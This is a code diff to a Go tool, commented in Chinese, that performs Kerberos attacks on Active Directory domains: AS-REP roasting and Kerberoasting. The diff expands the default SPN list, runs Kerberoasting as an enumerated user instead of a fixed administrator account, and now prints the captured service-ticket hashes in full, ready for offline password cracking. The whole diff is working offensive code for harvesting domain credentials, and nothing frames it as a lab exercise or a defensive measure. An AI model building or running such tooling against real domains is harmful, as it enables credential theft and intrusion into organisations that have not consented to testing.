@@ -55,6 +55,8 @@ var DefaultSPNs = []string{
 	"FTP/ftp01.%s",
 	"kadmin/kdc01.%s",
 	"http/www01.%s",
+	"HTTP/web01.%s",
+	"HTTP/api01.%s",
 }
 
 // ASREPResult: AS-REP Roast 结果
@@ -89,11 +91,11 @@ func DefaultConfig(kdc, domain string, users []string) *Config {
 	}
 }
 
-// expandSPNs: 填充域名的 SPN 字典
+// expandSPNs: 填充域名的 SPN 字典（主机用小写域，兼容大小写敏感 KDC）
 func expandSPNs(domain string) []string {
 	var out []string
 	for _, tpl := range DefaultSPNs {
-		out = append(out, fmt.Sprintf(tpl, domain))
+		out = append(out, fmt.Sprintf(tpl, strings.ToLower(domain)))
 	}
 	return out
 }
@@ -128,12 +130,11 @@ func Scan(cfg *Config) Result {
 		}
 	}
 
-	// 3) Kerberoast（有凭据）
-	if cfg.Password != "" {
+	// 3) Kerberoast（有凭据，用枚举到的第一个有效用户）
+	if cfg.Password != "" && len(res.Users) > 0 {
 		spns := expandSPNs(cfg.Domain)
-		hashes := Kerberoast(cfg.KDC, port, cfg.Domain, "administrator", cfg.Password, spns, timeout)
-		for i, h := range hashes {
-			res.SPNs = append(res.SPNs, SPNResult{SPN: spns[i], Hash: h})
+		for _, kr := range Kerberoast(cfg.KDC, port, cfg.Domain, res.Users[0], cfg.Password, spns, timeout) {
+			res.SPNs = append(res.SPNs, SPNResult{SPN: kr.SPN, Hash: kr.Hash})
 		}
 	}
 	return res
@@ -160,7 +161,7 @@ func Format(r Result) string {
 	if len(r.SPNs) > 0 {
 		sb.WriteString(fmt.Sprintf("  Kerberoastable SPNs (%d):\n", len(r.SPNs)))
 		for _, s := range r.SPNs {
-			sb.WriteString(fmt.Sprintf("    %s: %s\n", s.SPN, truncate(s.Hash, 80)))
+			sb.WriteString(fmt.Sprintf("    %s: %s\n", s.SPN, s.Hash))
 		}
 	}
 	if len(r.ASREP) == 0 && len(r.SPNs) == 0 && len(r.Users) == 0 {
